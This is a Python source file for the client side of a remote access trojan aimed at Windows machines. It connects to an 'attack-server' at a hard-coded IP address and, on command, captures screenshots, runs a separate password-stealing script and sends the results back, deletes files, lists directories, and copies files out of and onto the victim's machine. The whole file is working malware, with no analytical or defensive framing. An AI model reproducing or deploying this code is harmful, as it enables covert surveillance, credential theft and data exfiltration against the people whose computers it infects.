import socket
import base64
import pyautogui
import time
import subprocess
import os
import shutil
import sys
import win32com.shell.shell as shell
import winreg



def get_target_passwords():
    # don't forget to change "get password.py" file into a exe file when u convert this file into a exe file also
    os.system('get_passwords.py')


try:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    DISCONNECT = "disconnect"
    HOST = "192.168.14.66"  # this should be your computer ip (attack-server)
    PORT = 3221

    client.connect((HOST, PORT))

    #print("Connected To {} With The Port {}".format(HOST, PORT))
    msg = ""


except ConnectionResetError:
    sys.exit(0)

except ConnectionRefusedError:
    sys.exit(0)


try:
    while True:
        msg = client.recv(1024).decode("utf-8")


        if msg == "screenshot":
            pyautogui.screenshot("image.png")

            with open("image.png", "rb") as image_file:
                encode_string = base64.b64encode(image_file.read())

                client.send(bytes(encode_string))

            os.remove("image.png")

        elif msg == "password":
            get_target_passwords()
            with open('p.txt', 'rb') as passwords_file:
                passwords_encode = base64.b64encode(passwords_file.read())
                client.send(bytes(passwords_encode))

            os.remove('p.txt')


        elif msg == "remove":
            try:
                FileToRemove = client.recv(10000).decode("utf-8")
                os.remove(FileToRemove)
                client.send(bytes(f"The File : {FileToRemove} Removed!", "utf-8"))

            except FileNotFoundError:
                sys.exit(0)

        elif msg == "ls":

            Files_list = subprocess.run("dir", shell=True, capture_output=True)
            List = Files_list.stdout.decode()
            client.send(bytes(List, "utf-8"))


        elif msg == "search":
            DirectoryPath = client.recv(10000).decode("utf-8")

            try:
                FilesNames = os.listdir(DirectoryPath)
                FilesInDirectory = []

                for file in FilesNames:
                    FilesInDirectory.append(file)

                else:
                    pass

                client.send(bytes("\n".join(FilesInDirectory), "utf-8"))

            except FileNotFoundError:
                client.send(bytes("Directory Not Found!", "utf-8"))


        elif msg == "copy":
            FileToMoveSrc = client.recv(1024).decode("utf-8")

            with open(FileToMoveSrc, "rb") as FTM:
                encode_file = base64.b64encode(FTM.read())
                client.send(bytes(encode_file))
                FTM.close()


        elif msg == "send":
            FileType = client.recv(100000)
            SendingFile = client.recv(100000000)

            with open(FileType, "wb") as FT:
                FT.write(base64.decodebytes(SendingFile))



        elif msg == "disconnect":
            sys.exit(0)


except ConnectionResetError:
    sys.exit(0)

except ConnectionRefusedError:
    sys.exit(0)

except ConnectionAbortedError:
    sys.exit(0)

except ConnectionError:
    sys.exit(0)
